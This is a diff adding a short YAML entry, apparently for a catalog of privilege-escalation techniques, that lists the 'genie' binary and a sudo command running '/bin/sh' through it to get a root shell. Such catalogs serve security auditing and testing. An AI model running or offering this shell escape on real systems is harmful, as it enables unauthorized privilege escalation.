@@ -1,0 +1,4 @@
+name: genie
+binary_path: /usr/bin/genie
+exploit_cmds:
+- sudo /usr/bin/genie -c '/bin/sh'
